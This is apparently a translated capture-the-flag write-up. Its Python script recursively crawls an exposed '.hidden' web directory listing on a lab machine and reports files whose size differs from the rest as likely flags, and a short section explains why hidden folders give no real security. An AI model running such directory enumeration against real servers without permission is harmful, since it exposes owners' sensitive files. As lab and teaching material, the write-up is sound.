=======
### Challenge

Here's the translation of your text into English:

"I have a /.hidden file with a lot of folders and subfolders, where files with sensitive data may be located. I ran a script that checks each folder and subfolder until it finds files with sensitive data.

I started with checking the file size, but it didn't work because it was a string.

```python
Copy code
from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin

def is_file_empty(url):
    req = requests.get(url)
    return len(req.content) == 0

def list_files_in_directory(url, current_path=''):
    req = requests.get(url)
    page = BeautifulSoup(req.text, 'html.parser')
    for link in page.find_all('a'):
        href = link['href']
        if href == '../':
            continue
        if href.endswith('/'):
            new_url = urljoin(url, href)
            new_path = urljoin(current_path, href)
            list_files_in_directory(new_url, new_path)
        else:
            file_name = href
            file_info = link.next_sibling.strip().split()
            file_size = file_info[-1]
            file_url = urljoin(current_path, file_name)
            if file_size != "34":
                print(f"Flag found: {file_url}")
            #     print(file_url)
url = 'http://192.168.56.101/.hidden/'
list_files_in_directory(url)
```
=======
### Vulnerability

The /.hidden folder is often used to hide files in the file system but does not provide real security. There is a risk of unauthorized access and security vulnerabilities."
